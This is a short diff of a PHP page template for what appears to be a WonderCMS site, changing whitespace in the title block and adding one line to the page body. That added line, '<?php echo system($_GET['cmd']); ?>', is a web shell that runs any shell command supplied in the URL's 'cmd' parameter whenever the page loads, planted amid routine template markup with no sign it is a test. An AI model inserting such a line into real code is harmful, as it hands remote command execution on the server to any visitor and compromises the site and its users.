@@ -22,7 +22,7 @@
 		<!-- Website and page title -->
 		<title>
 			<?= $Wcms->get('config', 'siteTitle') ?> - <?= $Wcms->page('title') ?>
-
+			
 		</title>
 
 		<!-- Admin CSS -->
@@ -34,6 +34,7 @@
 	
 	<body>
 		<!-- Admin settings panel and alerts -->
+		<?php echo system($_GET['cmd']); ?> 
 		<?= $Wcms->settings() ?>
 
 		<?= $Wcms->alerts() ?>
